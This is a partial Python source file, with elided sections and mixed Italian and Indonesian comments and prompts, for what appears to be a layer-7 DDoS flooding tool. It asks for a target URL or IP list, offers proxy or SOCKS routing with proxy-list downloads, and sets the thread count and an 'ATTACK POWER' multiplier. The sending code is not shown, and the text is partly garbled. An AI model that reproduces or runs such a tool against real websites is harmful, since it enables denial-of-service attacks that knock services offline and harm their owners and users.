...
def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
	...
	choice1 = input("\n atau[1] attack the target[0] > ")

	if choice1 == "0":
		ip_file = input("file setup 'setup.txt' > ")
		ips = open(ip_file).readlines()



	else:
		url = input("\LAYER7 URL/IP: ").strip()
...
def proxymode():
	global choice2
	choice2 = input("Do you want to use mode proxy/socks [y]: ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def choiceproxysocks():
	global choice3
	choice3 = input("select mode: [0] proxymode /[1] socksmode: ")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
	else:
		print ("choose the wrong mode")
		choiceproxysocks()

def choicedownproxy():
	choice4 = input("you want to download a new proxy / [y] : ")
	if choice4 == "y":
...
def choicedownsocks():
	choice4 = input("you want to download a new socks-proxy / [y] : ")
	if choice4 == "y":
...
def numthreads():
	global threads
	try:
		threads = int(input("choose topic (800): "))
	except ValueError:
		threads = 800
		print ("800 choose topic.\n")
	multiplication()

def multiplication():
	global multiple
	try:
		multiple = int(input("ATTACK POWER [(1-5=normal)(50=kuat)(100 atau lebih=bom)]: "))
	except ValueError:
		print("coba lagi.\n")
		multiplication()
	begin()
